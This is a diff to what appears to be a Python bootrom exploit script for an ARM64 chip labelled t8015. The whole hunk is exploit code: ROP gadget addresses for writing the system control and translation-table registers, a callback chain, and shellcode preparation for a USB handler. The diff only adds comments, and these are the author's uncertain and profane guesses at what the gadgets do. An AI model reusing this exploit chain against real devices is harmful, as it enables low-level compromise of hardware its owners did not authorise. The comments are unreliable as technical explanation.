@@ -392,28 +392,28 @@ def payload(cpid):
         PAYLOAD_SIZE_ARM64, # 7 - PAYLOAD_SIZE
                0x180008638, # 8 - PAYLOAD_PTR
     ]
-    t8015_load_write_gadget        = 0x10000945C
-    t8015_write_sctlr_gadget       = 0x1000003EC
-    t8015_func_gadget              = 0x10000A9AC
-    t8015_write_ttbr0              = 0x10000045C
-    t8015_tlbi                     = 0x1000004AC
-    t8015_dc_civac                 = 0x1000004D0
-    t8015_dmb                      = 0x1000004F0
-    t8015_handle_interface_request = 0x10000BCCC
+    t8015_load_write_gadget        = 0x10000945C # gadget to...write things i guess?
+    t8015_write_sctlr_gadget       = 0x1000003EC # gadget to write to system control register?
+    t8015_func_gadget              = 0x10000A9AC # i have no god damn clue what this is for
+    t8015_write_ttbr0              = 0x10000045C # write to translation table base register 0?
+    t8015_tlbi                     = 0x1000004AC # translation lookaside buffer invalid. used as an alias of sys
+    t8015_dc_civac                 = 0x1000004D0 # (d)ata or unified (c)ache line (c)lean and (i)nvalidate by (va) to po(c)
+    t8015_dmb                      = 0x1000004F0 # data memory barrier instruction>
+    t8015_handle_interface_request = 0x10000BCCC # no fucking clue
     t8015_callbacks = [
-      (t8015_dc_civac, 0x18001C800),
-      (t8015_dc_civac, 0x18001C840),
-      (t8015_dc_civac, 0x18001C880),
-      (t8015_dmb, 0),
-      (t8015_write_sctlr_gadget, 0x100D),
-      (t8015_load_write_gadget, 0x18001C000),
-      (t8015_load_write_gadget, 0x18001C010),
-      (t8015_write_ttbr0, 0x180020000),
-      (t8015_tlbi, 0),
-      (t8015_load_write_gadget, 0x18001C020),
-      (t8015_write_ttbr0, 0x18000C000),
-      (t8015_tlbi, 0),
-      (0x18001C800, 0),
+      (t8015_dc_civac, 0x18001C800), # (d)ata or unified (c)ache line (c)lean and (i)nvalidate by (va) to po(c)
+      (t8015_dc_civac, 0x18001C840), # (d)ata or unified (c)ache line (c)lean and (i)nvalidate by (va) to po(c)
+      (t8015_dc_civac, 0x18001C880), # (d)ata or unified (c)ache line (c)lean and (i)nvalidate by (va) to po(c)
+      (t8015_dmb, 0), # data memory barrier instruction>
+      (t8015_write_sctlr_gadget, 0x100D), # gadget to write to system control register?
+      (t8015_load_write_gadget, 0x18001C000), # gadget to...write things i guess?
+      (t8015_load_write_gadget, 0x18001C010), # gadget to...write things i guess?
+      (t8015_write_ttbr0, 0x180020000), # write to translation table base register 0?
+      (t8015_tlbi, 0), # translation lookaside buffer invalid. used as an alias of sys
+      (t8015_load_write_gadget, 0x18001C020), # gadget to...write things i guess?
+      (t8015_write_ttbr0, 0x18000C000), # write to translation table base register 0 but...different?
+      (t8015_tlbi, 0), # translation lookaside buffer invalid. used as an alias of sys
+      (0x18001C800, 0), # no fucking clue
     ]
     t8015_callback_data = usb_rop_callbacks(0x18001C020, t8015_func_gadget, t8015_callbacks)
     t8015_handler = asm_arm64_x7_trampoline(t8015_handle_interface_request) + asm_arm64_branch(0x10, 0x0) + prepare_shellcode('usb_0xA1_2_arm64', constants_usb_t8015)[4:]
